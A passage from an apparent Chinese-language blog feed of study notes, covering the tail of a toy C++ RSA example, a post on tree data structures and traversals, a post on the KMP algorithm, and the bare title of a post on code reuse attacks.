class="hljs-number">0</span>)&#123;<br>        x = <span class="hljs-number">1</span>;<br>        y = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">return</span> a;<br>    &#125;<br>    <span class="hljs-type">int</span> ans = <span class="hljs-built_in">gcd</span>(b, a % b,x,y);<br>    <span class="hljs-type">int</span> temp = x;<br>    x = y;<br>    y = temp - a / b * y;<br>    <span class="hljs-keyword">return</span> ans;<br>&#125;<br><br><span class="hljs-comment">//快速幂运算</span><br><span class="hljs-function"><span class="hljs-type">long</span> <span class="hljs-type">long</span> <span class="hljs-title">quickPow</span><span class="hljs-params">(<span class="hljs-type">long</span> <span class="hljs-type">long</span> m, <span class="hljs-type">int</span> e, <span class="hljs-type">int</span> n)</span> </span>&#123;<br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> sum = <span class="hljs-number">1</span>;<br>    m = m % n;<br>    <span class="hljs-keyword">while</span> (e &gt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">if</span> (e % <span class="hljs-number">2</span> == <span class="hljs-number">1</span>) <br>            sum = (sum * m) % n;<br>        e = e / <span class="hljs-number">2</span>;<br>        m = (m*m) % n; <br>    &#125;<br>    <span class="hljs-keyword">if</span> (sum &lt; <span class="hljs-number">0</span>) <br>        sum = sum + n;<br><br>    <span class="hljs-keyword">return</span> sum;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>    <br>    cout &lt;&lt; <span class="hljs-string">&quot;step 1 : 公私密钥产生&quot;</span> &lt;&lt; endl;<br>    <span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">pq</span><span class="hljs-params">(<span class="hljs-number">2</span>)</span></span>;<br>    pq = <span class="hljs-built_in">Create_Prime</span>();<br>    <span class="hljs-type">int</span> p = pq[<span class="hljs-number">0</span>];<br>    <span class="hljs-type">int</span> q = pq[<span class="hljs-number">1</span>];<br>    cout &lt;&lt; <span class="hljs-string">&quot; 质数p=  &quot;</span>&lt;&lt;pq[<span class="hljs-number">0</span>] &lt;&lt;<span class="hljs-string">&quot;   &quot;</span> &lt;&lt;<span class="hljs-string">&quot;质数q= &quot;</span>&lt;&lt; pq[<span class="hljs-number">1</span>]&lt;&lt;endl;<br>    <span class="hljs-type">int</span> n = p * q;<br>    <span class="hljs-type">int</span> phi_n = (p - <span class="hljs-number">1</span>) * (q - <span class="hljs-number">1</span>);<br>    <br>    <span class="hljs-comment">// 获得公钥e;</span><br>    <span class="hljs-type">int</span> e = <span class="hljs-built_in">rand</span>()%phi_n;<br>    <span class="hljs-comment">//公钥e必须要跟φ(n)互素</span><br>    <span class="hljs-type">int</span> x,y;<br>    <span class="hljs-keyword">while</span> (<span class="hljs-built_in">gcd</span>(phi_n,e,x,y) != <span class="hljs-number">1</span>) <br>        e = <span class="hljs-built_in">rand</span>() % phi_n;<br>    cout &lt;&lt; <span class="hljs-string">&quot; 公钥e= &quot;</span> &lt;&lt; e &lt;&lt;endl;<br>    <span class="hljs-type">int</span> d = y % phi_n;<br>    cout &lt;&lt; <span class="hljs-string">&quot; 私钥d= &quot;</span> &lt;&lt; d &lt;&lt;endl;<br><br>    cout &lt;&lt;<span class="hljs-string">&quot;-----------------------------------------&quot;</span>&lt;&lt;endl;<br>    cout &lt;&lt; <span class="hljs-string">&quot;step 2: 加密 &quot;</span>&lt;&lt;endl;<br>    string s;<br>    cout &lt;&lt; <span class="hljs-string">&quot;请输入明文：&quot;</span>;<br>    <span class="hljs-built_in">getline</span>(cin, s);<br>    <span class="hljs-type">int</span> s_len = s.<span class="hljs-built_in">size</span>();<br>    <span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">m</span><span class="hljs-params">(s_len)</span></span>;<br>    <span class="hljs-function">vector&lt;<span class="hljs-type">long</span> <span class="hljs-type">long</span>&gt; <span class="hljs-title">encode_m</span><span class="hljs-params">(s_len)</span></span>;<br>    cout &lt;&lt; <span class="hljs-string">&quot;密文为：&quot;</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; s_len; i++)&#123;<br>        m[i] = s[i];<br>        encode_m[i] = <span class="hljs-built_in">quickPow</span>(m[i], e, n);<br>        cout &lt;&lt; encode_m[i];<br>    &#125;<br>    cout &lt;&lt; endl&lt;&lt;endl;<br><br>    cout &lt;&lt;<span class="hljs-string">&quot;-----------------------------------------&quot;</span>&lt;&lt;endl;<br>    cout &lt;&lt; <span class="hljs-string">&quot;step 3: 解密 &quot;</span>&lt;&lt;endl;<br>    cout &lt;&lt; <span class="hljs-string">&quot;解密结果为：&quot;</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; s_len; i++) &#123;<br>        <span class="hljs-type">long</span> <span class="hljs-type">long</span> outcode_m = <span class="hljs-built_in">quickPow</span>(encode_m[i], d, n);<br>        cout  &lt;&lt; <span class="hljs-built_in">char</span>(outcode_m);<br>    &#125;<br>    cout &lt;&lt; endl&lt;&lt;endl;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>数据结构--树</title>
    <link href="/2023/03/08/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84--%E6%A0%91/"/>
    <url>/2023/03/08/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84--%E6%A0%91/</url>
    
    <content type="html"><![CDATA[<h2 id="一、数据结构–树"><a href="#一、数据结构–树" class="headerlink" title="一、数据结构–树"></a>一、数据结构–树</h2><h3 id="1-1-树的定义"><a href="#1-1-树的定义" class="headerlink" title="1.1 树的定义"></a>1.1 树的定义</h3><p>树是n(n&gt;&#x3D;0)个节点的有限集，n&#x3D;0时称为空树。在任意一棵非空树中：（1）有且仅有一个特定的称为根的节点；（2）当n&gt;1的时候，其余节点可分为m(m&gt;0)个互不相交的有限集T <del>1</del>，T<del>2</del>，……，T<del>m</del>，其中每一个集合本身又是一棵树，并且称为根的子树，如图：</p><p><img src="/2023/03/08/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84--%E6%A0%91/image-20230308143056394.png" alt="树"></p><h3 id="1-2-结点分类"><a href="#1-2-结点分类" class="headerlink" title="1.2 结点分类"></a>1.2 结点分类</h3><p>结点拥有的子树数称为结点的<code>度</code></p><p>度为0的节点称为叶节点或者终端节点</p><p>度不为0的节点称为非终端节点或分支节点</p><p>除了根节点之外，分支节点也称为内部节点。</p><p>树的度是树内各节点的度的最大值</p><h3 id="1-3-节点间关系"><a href="#1-3-节点间关系" class="headerlink" title="1.3 节点间关系"></a>1.3 节点间关系</h3><p>节点的子树的根称为该节点的孩子，该节点称为孩子的双亲</p><p>同一个双亲的孩子之间互称兄弟</p><p>节点的祖先是从根到该节点所经分支上的所有节点，某节点为根的子树中的任一节点都称为该节点的子孙。</p><p><img src="/2023/03/08/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84--%E6%A0%91/image-20230308143802564.png" alt="节点间关系"></p><p>结点的层次是从根开始定义起，根为第一层，根的孩子为第二层……</p><p>树中结点的最大层次称为树的深度或高度，上图中树的深度就为4</p><p><code>线性结构与树结构的区别</code></p><p>线性结构：第一个元素无前驱，中间元素既有前驱也有后继，最后一个元素无后继</p><p>树结构：根节点无双亲，有孩子；中间节点有双亲也有孩子；叶子节点无孩子，有双亲</p><h3 id="1-4-树的存储结构"><a href="#1-4-树的存储结构" class="headerlink" title="1.4 树的存储结构"></a>1.4 树的存储结构</h3><p>树的结构的表示方法：<code>双亲表示法</code>、<code>孩子表示法</code>、<code>孩子兄弟表示法</code></p><h4 id="1-4-1-双亲节点表示法"><a href="#1-4-1-双亲节点表示法" class="headerlink" title="1.4.1 双亲节点表示法"></a>1.4.1 双亲节点表示法</h4><p>每一个结点中，附设一个指示器指示其双亲结点到链表中的位置。</p><p><img src="/2023/03/08/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84--%E6%A0%91/image-20230308144210730.png" alt="双亲结点结构"></p><p><img src="/2023/03/08/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84--%E6%A0%91/image-20230308144629251.png" alt="image-20230308144629251"></p><p><img src="/2023/03/08/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84--%E6%A0%91/image-20230308144639401.png" alt="image-20230308144639401"></p><p>双亲表示法的好处很容易可以知道某个节点的双亲节点（O（1）），但是如果想要知道节点的孩子是什么，那就需要遍历整个结构。双亲表示法无法体现兄弟之间的关系</p><h4 id="1-4-2-孩子表示法"><a href="#1-4-2-孩子表示法" class="headerlink" title="1.4.2 孩子表示法"></a>1.4.2 孩子表示法</h4><p>由于树中每个结点可能有多棵子树，考虑使用多重链表，每个结点有多个指针域，其中每个指针指向一棵子树的根节点，这种方法叫做多重链表表示法。</p><p>方案一：指针域的个数等于树的度</p><p><img src="/2023/03/08/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84--%E6%A0%91/image-20230308144908084.png" alt="image-20230308144908084"></p><p><img src="/2023/03/08/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84--%E6%A0%91/image-20230308144919449.png" alt="image-20230308144919449"></p><p>但是这种方式对于树中各结点的度相差很大的时候，这种方法是很浪费空间的，因为有很多的结点他的指针域都是空的，不过如果树的各结点度相差很小的时候，那就意味着开辟的空间被充分利用了</p><p>方案二：指针域的个数等于该结点的度</p><p><img src="/2023/03/08/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84--%E6%A0%91/image-20230308145148687.png" alt="image-20230308145148687"></p><p>data是数据域，degree是度域，也就是存储该结点的孩子结点的个数，child1-childd为指针域，指向该结点的各个孩子的结点。</p><p><img src="/2023/03/08/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84--%E6%A0%91/image-20230308145312109.png" alt="image-20230308145312109"></p><p>这种方法克服了浪费空间的缺点，对空间利用率确实很高，但是由于各个结点的链表是不相同的结构，加上要维护结点的度的数值，在运算上就会带来时间上的损耗。</p><p>结合这两种方法，得到了<code>孩子表示法</code></p><p>把每个结点的孩子排列起来，以单链表作存储结构，则n个结点有n个孩子链表，如果是叶子结点则此单链表为空，然后n个头指针又组成一个线性表，采用顺序存储结构，存放进一个一维数组中</p><p><img src="/2023/03/08/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84--%E6%A0%91/image-20230308150232650.png" alt="image-20230308150232650"></p><p>设计两种结点结构，一个是孩子链表的孩子结点</p><p><img src="/2023/03/08/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84--%E6%A0%91/image-20230308150313401.png" alt="image-20230308150313401"></p><p>另一个是表头数组的表头结点</p><p><img src="/2023/03/08/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84--%E6%A0%91/image-20230308150341903.png" alt="image-20230308150341903"></p><p>但是这样的结构对于我们要查找某个结点的某个孩子，或者找某个结点的兄弟，只需要查找这个结点的孩子单链表即可。但是如何知道某个结点的双亲是谁呢？很麻烦，需要遍历整个树才行</p><p>所以推出了双亲孩子表示法</p><p><img src="/2023/03/08/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84--%E6%A0%91/image-20230308150655257.png" alt="image-20230308150655257"></p><h4 id="1-4-3-孩子兄弟表示法"><a href="#1-4-3-孩子兄弟表示法" class="headerlink" title="1.4.3 孩子兄弟表示法"></a>1.4.3 孩子兄弟表示法</h4><p>对于任意一棵树，它的结点的第一个孩子如果存在就是唯一的，它的右兄弟如果存在也是唯一的。因此我们设置两个指针，分别指向该结点的第一个孩子和此结点的右兄弟</p><p>结点结构如下：</p><p><img src="/2023/03/08/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84--%E6%A0%91/image-20230308151735881.png" alt="image-20230308151735881"></p><p><code>data</code>是数据域，<code>firstchild</code>为指针域，存储该结点的第一个孩子结点的存储地址，<code>rightsib</code>是指针域，存储该结点的右兄弟结点的存储地址</p><p><img src="/2023/03/08/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84--%E6%A0%91/image-20230308152116686.png" alt="image-20230308152116686"></p><p>这种表示法，给查找某个结点的某个孩子带来了方便，只需要通过firstchild找到此结点的长子，然后通过长子结点的rightsib找到他的二弟，接着一直找下去，直到找到具体的孩子。</p><p>将其进行变形，就是一棵二叉树</p><p><img src="/2023/03/08/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84--%E6%A0%91/image-20230308152909086.png" alt="image-20230308152909086"></p><h2 id="二、二叉树"><a href="#二、二叉树" class="headerlink" title="二、二叉树"></a>二、二叉树</h2><p>二叉树是n（n&gt;&#x3D;0)个结点的有限集合，该集合或者为空集，或者由一个根结点和两棵互不相交的，分别称为根结点的左子树和右子树的二叉树组成。</p><h3 id="2-1-特点"><a href="#2-1-特点" class="headerlink" title="2.1 特点"></a>2.1 特点</h3><p>（1）每个结点最多只有两棵子树，所以二叉树中不存在度大于2的结点。</p><p>（2）左子树和右子树是有顺序的</p><p>（3）即使树中某个结点只有一棵子树，也要区分他是左子树还是右子树</p><p>五种形态：<code>空二叉树</code>，<code>只有一个根结点</code>，<code>根结点只有左子树</code>，<code>根节点只有右子树</code>，<code>根结点既有左子树又有右子树</code>。</p><h3 id="2-2-特殊二叉树"><a href="#2-2-特殊二叉树" class="headerlink" title="2.2 特殊二叉树"></a>2.2 特殊二叉树</h3><p><strong>斜树</strong>：所有结点都只有左子树的二叉树叫左斜树。所有结点都是只有右子树的二叉树叫右斜树。统称斜树</p><p><strong>满二叉树</strong>：在一棵二叉树中，如果所有分支结点都存在左子树和右子树，并且所有叶子都在同一层中上，这样的二叉树称为满二叉树。</p><p><img src="/2023/03/08/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84--%E6%A0%91/image-20230308153739114.png" alt="满二叉树"></p><p>满二叉树的特点：</p><p>（1）叶子只能出现在最下一层。</p><p>（2）非叶子结点的度一定是2。</p><p>（3）在同样深度的二叉树中，满二叉树的结点个数最多，叶子树最多</p><p><strong>完全二叉树</strong>：对一棵具有n个结点的二叉树按层编号，如果编号为i的结点与同样深度的满二叉树中编号为i的结点在二叉树中位置完全相同，则这棵二叉树称为完全二叉树</p><p><img src="/2023/03/08/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84--%E6%A0%91/image-20230308154038901.png" alt="image-20230308154038901"></p><p>完全二叉树的特点：</p><p>（1）叶子结点只能出现在最下两层</p><p>（2）最下层的叶子一定集中在左部连续位置</p><p>（3）倒数二层，若有叶子结点，一定都在右部连续位置</p><p>（4）如果结点度为1，则该结点只有左孩子，即不存在只有右子树的情况</p><p>（5）同样结点数的二叉树，完全二叉树的深度最小</p><h2 id="三、性质"><a href="#三、性质" class="headerlink" title="三、性质"></a>三、性质</h2><p>性质1：在二叉树的第i层上至多有2^i-1^个结点（i&gt;&#x3D;1)</p><p>性质2：深度为k的二叉树至多有2^k^-1个结点</p><p>性质3：对任何一棵二叉树T，如果其终端结点数为n<del>0</del>，度为2的结点数为n<del>2</del>，则n<del>0</del>&#x3D;n<del>2</del>+1</p><p>性质4：具有n个结点的完全二叉树的深度为⌊log<del>2</del>n⌋+1</p><p>性质5：如果对一棵有n个结点的完全二叉树的结点按层序编号（从第1层到⌊log<del>2</del>n⌋+1层，每层从左到右），对任一结点i（1&lt;&#x3D;i&lt;&#x3D;n）有</p><p>（1）如果i&#x3D;1,则结点i是二叉树的根，无双亲；如果i&gt;1，则其双亲是结点⌊i&#x2F;2⌋。</p><p>（2）如果2i&gt;n，则结点i无左孩子；否则其左孩子是结点2i</p><p>（3）如果2i+1&gt;n，则结点i无右孩子；否则其右孩子是结点2i+1</p><h2 id="四、存储结构"><a href="#四、存储结构" class="headerlink" title="四、存储结构"></a>四、存储结构</h2><h3 id="4-1-顺序存储"><a href="#4-1-顺序存储" class="headerlink" title="4.1 顺序存储"></a>4.1 顺序存储</h3><p>用一维数组存储二叉树中的结点，并且结点的存储位置，也就是数组的下标要能体现结点之间的逻辑关系。</p><p><img src="/2023/03/08/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84--%E6%A0%91/image-20230308182008141.png" alt="image-20230308182008141"></p><p><img src="/2023/03/08/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84--%E6%A0%91/image-20230308182016273.png" alt="image-20230308182016273"></p><p>但是考虑一棵深度为k的右斜树，它只有k个结点，却要分配2^k^-1个存储单元空间，这对于空间开销是很大的，如下图</p><p><img src="/2023/03/08/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84--%E6%A0%91/image-20230308182238012.png" alt="右斜树"></p><h3 id="4-2-二叉链表"><a href="#4-2-二叉链表" class="headerlink" title="4.2 二叉链表"></a>4.2 二叉链表</h3><p>二叉树每个结点最多有两个孩子，所以为它设计一个数据域和两个指针域，这样的链表叫做二叉链表。</p><p><img src="/2023/03/08/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84--%E6%A0%91/image-20230308182408631.png" alt="image-20230308182408631"></p><p><img src="/2023/03/08/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84--%E6%A0%91/image-20230308182435301.png" alt="image-20230308182435301"></p><h2 id="五、遍历二叉树"><a href="#五、遍历二叉树" class="headerlink" title="五、遍历二叉树"></a>五、遍历二叉树</h2><p>二叉树的遍历是指从根节点出发，按照某种次序依次访问二叉树中所有结点，使得每个结点都访问依次且仅被访问一次</p><h3 id="5-1-前序遍历"><a href="#5-1-前序遍历" class="headerlink" title="5.1 前序遍历"></a>5.1 前序遍历</h3><p>规则是若二叉树为空，则空操作返回，否则先访问根结点，然后前序遍历左子树，再前序遍历右子树。即：根、左、右</p><p><img src="/2023/03/08/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84--%E6%A0%91/image-20230308182747368.png" alt="image-20230308182747368"></p><p>该图的前序遍历结果应该为：<strong>ABDGHCEIF</strong></p><h3 id="5-2-中序遍历"><a href="#5-2-中序遍历" class="headerlink" title="5.2 中序遍历"></a>5.2 中序遍历</h3><p>规则是若树为空，则空操作返回，否则从根结点开始（注意不是先访问根节点），中序遍历根节点的左子树，然后访问根节点，最后中序遍历右子树。即：左、根、右</p><p><img src="/2023/03/08/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84--%E6%A0%91/image-20230308183005863.png" alt="image-20230308183005863"></p><p>该图的中序遍历结果应该为：<strong>GDHBAEICF</strong></p><h3 id="5-3-后序遍历"><a href="#5-3-后序遍历" class="headerlink" title="5.3 后序遍历"></a>5.3 后序遍历</h3><p>规则是若树为空，则空操作返回，否则从左到右先叶子后结点的方式遍历左右子树，最后访问根节点。即：左、右、根</p><p><img src="/2023/03/08/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84--%E6%A0%91/image-20230308183236471.png" alt="image-20230308183236471"></p><p>该图的后序遍历结果应该为：<strong>GHDBIEFCA</strong></p><h3 id="5-4-层序遍历"><a href="#5-4-层序遍历" class="headerlink" title="5.4 层序遍历"></a>5.4 层序遍历</h3><p>规则是若树为空，则空操作返回，否则从树的第一层，也就是根结点开始访问，从上而下逐层遍历，在同一层中，按从左到右的顺序对结点逐个访问</p><p><img src="/2023/03/08/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84--%E6%A0%91/image-20230308183426890.png" alt="image-20230308183426890"></p><p>该图的层序遍历的结果应该为：<strong>ABCDEFGHI</strong></p><h3 id="5-5-推导遍历结果"><a href="#5-5-推导遍历结果" class="headerlink" title="5.5 推导遍历结果"></a>5.5 推导遍历结果</h3><p>已知一棵二叉树的前序遍历序列为：<strong>ABCDEF</strong></p><p>中序遍历序列为：<strong>CBAEDF</strong></p><p>请问这棵二叉树的后序遍历结果是多少：<strong>CBEFDA</strong></p><p>前序遍历是<strong>ABCDEF</strong>，所以说第一个字母A被打印出来，说明A是根结点的数据，在中序遍历中找到A，所以可以推出CB是在A的左子树部分，EDF是在A的右子树部分</p><p><img src="/2023/03/08/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84--%E6%A0%91/image-20230308194519188.png" alt="image-20230308194519188"></p><p>然后我们再次看前序中的C和B，他的顺序是A<strong>BC</strong>DEF，是先打印B后打印C，所以B应该是A的左孩子，而C就只能是B的孩子，此时是左还是右孩子还不确定，在看中序遍历<strong>CB</strong>AEDF，C是在B的前面打印，这说明C是B的左孩子</p><p><img src="/2023/03/08/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84--%E6%A0%91/image-20230308194944933.png" alt="image-20230308194944933"></p><p>对于E、D、F，同样道理处理，最后可以得到</p><p><img src="/2023/03/08/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84--%E6%A0%91/image-20230308195036083.png" alt="image-20230308195036083"></p><p>所以他的后序遍历结果就是：<strong>CBEFDA</strong></p><p>已知前序遍历和中序遍历序列，可以唯一确定一棵二叉树</p><p>已知后序遍历和中序遍历序列，可以唯一确定一棵二叉树</p><p>已知前序和后序遍历是无法确定一棵二叉树的，比如</p><p>前序序列：ABC</p><p>后序序列：CBA</p><p>我们可以确定A一定是根结点，但是我们接下来无法确定哪个结点是左子树，哪个是右子树</p><p><img src="/2023/03/08/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84--%E6%A0%91/image-20230308195346443.png" alt="image-20230308195346443"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>KMP算法</title>
    <link href="/2023/03/06/KMP%E7%AE%97%E6%B3%95/"/>
    <url>/2023/03/06/KMP%E7%AE%97%E6%B3%95/</url>
    
    <content type="html"><![CDATA[<h1 id="KMP算法"><a href="#KMP算法" class="headerlink" title="KMP算法"></a>KMP算法</h1><h2 id="一、KMP算法与朴素模式匹配算法的比较"><a href="#一、KMP算法与朴素模式匹配算法的比较" class="headerlink" title="一、KMP算法与朴素模式匹配算法的比较"></a>一、KMP算法与朴素模式匹配算法的比较</h2><p>KMP算法是一个字符串匹配的快速算法，在一个已知字符串中查找子串的位置，也叫做串的模式匹配。</p><p>例如：主串S&#x3D;“<code>abcdehh</code>“，子串T&#x3D;”<code>cde</code>“</p><p>当字符串长度很小的时候，自然很容易看出来，但是如果字符串是这样的”<code>askjdahksjdhalksdlakjdlkajsdlkaldacmee</code>“，就已经让人头痛了吧，用算法来做，很容易可以想到用暴力搜索匹配就行，就是从主串的第一个字符开始查询，进行匹配，如果不符合就到主串的第二个字符进行查询，直到找到子串。这种方法也就是<code>朴素模式匹配算法</code>。</p><p>朴素模式匹配算法在最好情况下时间复杂度为O(n)，即子串的n个字符正好等于主串的前n个字符，而最坏的情况下**时间复杂度为O(m*n)**。即找到最后一个子串才匹配成功。</p><p>而为了提高效率，我们推出了<strong>KMP</strong>算法，有一说一，这个算法非常烧脑</p><p>对于给定的一个主串：<strong>abcabdacbademc</strong>，一个给定的子串：<strong>abcabcm</strong></p><p>我们第一次比较必然是这样的：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c++">a b c a b d a c b a d e m c<br>a b c a b c m  <br></code></pre></td></tr></table></figure><p>发现在第6位字符不相同，接下来区别于朴素模式匹配算法的就在于子串该怎么移动</p><p>应该做如下移动</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c++">a b c a b d a c b a d e m c<br>      a b c a b c m <br></code></pre></td></tr></table></figure><p>至于这么移动的合理性，可以自己进行推算，前面的比如：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c++">a b c a b d a c b a d e m c<br>  a b c a b c m  <br></code></pre></td></tr></table></figure><p>这样的是绝对不可能匹配的，因为我们知道对于主串来说，a再次出现的位置在主串的第四位，也就是说在2,3位没有a，可子串是以a开头的，所以必然无法匹配。</p><h2 id="二、最长相等前后缀"><a href="#二、最长相等前后缀" class="headerlink" title="二、最长相等前后缀"></a>二、最长相等前后缀</h2><p>为了方便说明我们移动的具体位置，我们引入<strong>最长相等前后缀</strong>的概念</p><p><strong>abcab</strong></p><p>前缀集合：**{a,ab,abc,abca}**</p><p>后缀集合：**{b,ab,cab,bcab}**</p><p>最长相等前后缀为：<strong>ab</strong></p><p>对于第一次匹配</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c++">a b c a b d a c b a d e m c<br>a b c a b c m <br></code></pre></td></tr></table></figure><p>相同部分是<strong>abcab</strong>，而它的最长相等前后缀是<strong>ab</strong>，而我们移动的结果就是让子串的最长相等前缀与主串相同部分的最长相等后缀对齐</p><p>即：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c++">a b c a b d a c b a d e m c<br>      a b c a b c m <br></code></pre></td></tr></table></figure><p>完成这一步之后，接下来的流程就是一个循环过程。</p><p>现在重新捋一遍</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c++">a b c a b d a c b a d e m c<br>a b c a b c m <br>           i=<span class="hljs-number">7</span><br></code></pre></td></tr></table></figure><p>这是第一遍比较，比较到第7位</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c++">a b c a b d a c b a d e m c<br>  a b c a b c m <br>         i=<span class="hljs-number">7</span><br></code></pre></td></tr></table></figure><p>第二遍比较，<strong>i</strong>依旧是<strong>7</strong>。</p><p>所以说我们其实是可以做到i一直增加，那我们只需要考虑<strong>j</strong>的变化了，而j的变化与主串其实没有什么关系，关键在于子串的结构中是否有重复的问题。</p><p>举两个例子：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c++">example <span class="hljs-number">1</span>:<br>a b c d e f g a b...<br>a b c d e x<br>         i=<span class="hljs-number">6</span>,j=<span class="hljs-number">6</span><br><span class="hljs-comment">//下一次比较变成</span><br>a b c d e f g a b...<br>          a b c d e x<br>         i=<span class="hljs-number">6</span>,j=<span class="hljs-number">1</span><br>    <br>example <span class="hljs-number">2</span>:<br>a b c a b a b c a...<br>a b c a b x<br>         i=<span class="hljs-number">6</span>,j=<span class="hljs-number">6</span><br><span class="hljs-comment">//下一次比较变成</span><br>a b c a b a b c a...<br>      a b c a b x...<br>         i=<span class="hljs-number">6</span>,j=<span class="hljs-number">3</span><br></code></pre></td></tr></table></figure><h2 id="三、next数组"><a href="#三、next数组" class="headerlink" title="三、next数组"></a>三、next数组</h2><p>所以<strong>j</strong>的值得多少取决于当前字符之前的串的最长相等前后缀的长度</p><p>比如：<strong>example 1</strong>中，<strong>x</strong>字符之前的串是<strong>a b c d e</strong> ,最长相等前后缀长度为<strong>0</strong>，所以<strong>j</strong>变成<strong>1</strong></p><p>​<strong>example 2</strong>中，<strong>x</strong>字符之前的串是<strong>a b c a b</strong> ,最长相等前后缀长度为<strong>2</strong>，所以<strong>j</strong>变成<strong>3</strong></p><p>这里用<strong>next[]<strong>数组来保存</strong>最长相等前后缀的长度+1</strong>的值</p><p>这里数组的值可能和上面的说法不一致，用的书上的说法</p><p><img src="/2023/03/06/KMP%E7%AE%97%E6%B3%95/image-20230307163142213.png" alt="image-20230307163142213"></p><p>举例：T&#x3D;”abcdex”</p><p>当j&#x3D;1，next[1]&#x3D;0</p><p>当j&#x3D;2，属于其他情况，next[2]&#x3D;1</p><p>当j&#x3D;3，属于其他情况，next[3]&#x3D;1</p><p>当j&#x3D;4，属于其他情况，next[4]&#x3D;1</p><p>所以，此T串的next[j]为011111</p><h2 id="四、KMP算法的改进"><a href="#四、KMP算法的改进" class="headerlink" title="四、KMP算法的改进"></a>四、KMP算法的改进</h2><p>例如：主串S&#x3D;”aaaabcde”，子串T&#x3D;”aaaaax”，其next数组值分别为012345，在开始的时候，当i&#x3D;5、j&#x3D;5的时候，我们发现“b”与”a”不相等，但是回溯之后，还是”a”和”b“比较，这其实是多余的比较，因为我们已经知道了”a”和”b”是必然不等的，所以这就是一个改进的地方。新增的next数组命名为：nextval数组。</p><p>KMP算法的改进为： <strong>如果a位字符与它next值指向的b位字符相等，则该a位的nextval就指向b位的nextval值，如果不等，则该a位的nextval值就是它自己a位的next值。</strong></p><p>PS：KMP算法确实非常的精妙，他的代码的简单性导致理解其中的逻辑非常的困难，在记录这次学习的过程中，也还是仅仅摸到了皮毛，日后再进行改进。。。。。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>代码重用攻击</title>
    <link href="/2023/03/06/%E4%BB%A3%E7%A0%81%E9%87%8D%E7%94%A8%E6%94%BB%E5%87%BB/"/>
    <url>/2023/03/06/%E4%BB%A3%E7%A0%81%E9%87%8D%E7%94%A8%E6%94%BB%E5%87%BB/</url>
    
